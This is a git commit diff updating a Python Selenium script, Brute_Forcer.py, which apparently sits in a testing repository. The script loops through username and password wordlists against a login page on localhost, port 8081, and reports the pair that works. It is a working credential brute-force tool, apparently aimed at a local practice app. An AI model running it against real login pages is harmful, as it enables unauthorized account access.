40489b667c64e2838a5d1e4cc2adae67cc57af46
jenkins <amirmahdifhp@gmail.com>
2025-08-14 16:57:29 -0400

    Update ,app_tests/Brute_Forcer/Brute_Forcer.py

--- app_tests/Brute_Forcer/Brute_Forcer.py
+++ app_tests/Brute_Forcer/Brute_Forcer.py
@@ -6,70 +6,107 @@ from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException
+from selenium.common.exceptions import TimeoutException
 import time
 
-# Variable Scope
-login_element = False
-User = "username"
-passwd = "password"
-Condition = "You have logged in as 'admin'" 
+lst_usernames = []
+lst_passwords = []
 
-chrome_options = Options()
+def key_mover(username_file="username.txt",password_file="password.txt"):
 
-# Add any desired Chrome options, e.g., headless mode for Jenkins
-chrome_options.add_argument("--headless")
-chrome_options.add_argument("--no-sandbox") # Important for Jenkins
-chrome_options.add_argument("--disable-dev-shm-usage") # Important for Jenkins
-chrome_options.binary_location = "/usr/bin/google-chrome-stable"
+    # Moving & Creating Pattern List
+    with open(username_file , "r") as x :
+            usernames = x.readlines()
+            for index in usernames:
+    #
+                lst_usernames.append(index)
 
-# Replace with the actual path to your chromedriver executable
-service_driver = Service("/usr/local/bin/chromedriver-linux64/chromedriver")
-driver = webdriver.Chrome(service=service_driver , options=chrome_options)
+    with open(password_file , "r") as y :
+            passwords = y.readlines()
+            for index in passwords:
+   #
+                lst_passwords.append(index)
 
-def Brute_Forcer(username_file="username.txt",password_file="password.txt"):
-    global User
-    global passwd
+    # Indexing & Fixing Pattern
+    for i in lst_usernames:
+        if '\n' in i:
+            index_value = lst_usernames.index(i)
+            print(f"{index_value}::{i}")
+            changed_pattern = i.replace('\n',"")
+            lst_usernames[index_value] = changed_pattern
+    print(lst_usernames)
+
+    for i in lst_passwords:
+        if '\n' in i:
+            index_value = lst_passwords.index(i)
+            print(f"{index_value}::{i}")
+            changed_pattern = i.replace('\n',"")
+            lst_passwords[index_value] = changed_pattern
+    print(lst_passwords)
+
+def Brute_Forcer():
+    global lst_usernames
+    global lst_usernames
+
     try :
 
-        with open(username_file , "r") as x :
-            usernames = x.readlines()
-        with open(password_file, "r") as y:
-            passwords = y.readlines()
-        for username in usernames:
-            for password in passwords:
+        key_mover()
+
+        for username in lst_usernames:
+            for password in lst_passwords:
                 print(f"trying with:\nusername: {username}\npassword: {password}")
+
+                chrome_options = Options()
+
+                # Add any desired Chrome options, e.g., headless mode for Jenkins
+                chrome_options.add_argument("--headless")
+                chrome_options.add_argument("--no-sandbox") # Important for Jenkins
+                chrome_options.add_argument("--disable-dev-shm-usage") # Important for Jenkins
+                chrome_options.binary_location = "/usr/bin/google-chrome-stable"
+
+                # Replace with the actual path to your chromedriver executable
+                service_driver = Service("/usr/local/bin/chromedriver-linux64/chromedriver")
+                driver = webdriver.Chrome(service=service_driver , options=chrome_options)
                 
                 driver.get('http://127.0.0.1:8081/login.php')
+                WebDriverWait(driver ,2).until(
+                    EC.presence_of_all_elements_located((By.NAME ,"username"))
+                )
                 username_input = driver.find_element(By.NAME ,"username")
+                username_input.send_keys(username)
+
+                WebDriverWait(driver ,2).until(
+                    EC.presence_of_all_elements_located((By.NAME ,"password"))
+                )
                 password_input = driver.find_element(By.NAME ,"password")
+                password_input.send_keys(password)
+
                 WebDriverWait(driver ,5).until(
                     EC.presence_of_all_elements_located((By.NAME ,"Login"))
                 )
                 login_button = driver.find_element(By.NAME ,"Login")
                 
-                username_input.clear()
-                password_input.clear()
-                
-                username_input.send_keys(username)
-                password_input.send_keys(password)
-                
                 login_button.click()
-                time.sleep(3)
-
-                WebDriverWait(driver ,5).until(
-                    EC.presence_of_all_elements_located((By.CLASS_NAME,"message"))
-                )
-                msg = driver.find_element(By.CLASS_NAME,"message")
+                time.sleep(5)
                 
-                if "Login failed" in msg.text :
+                WebDriverWait(driver ,3).until(
+                    EC.presence_of_all_elements_located((By.ID,"content"))
+                )
+                content = driver.find_element(By.ID,"content")
+                #print(content.text)
+                if "Login failed" in content.text:
                     print("Login failed !!")
+                    driver.quit()
                     continue
                 else:
-                    print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
-                    return "access permit !"
+                    print(f"Login passed ! with\nusername:{username}password-key:{password}")
+                    return "\nAccess Authurized !"
+                
+    except TimeoutException:
+        print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
+        return "\nAccess Authurized !"
     except NoSuchElementException :
-        welcome_text = driver.find_element(By.ID ,"main_body").text
-        print(welcome_text)
-        print("Login passed !")
+        print(f"Login passed ! with\nusername:{username}\npassword-key:{password}")
+        return "\nAccess Authurized !"
              
 Brute_Forcer()
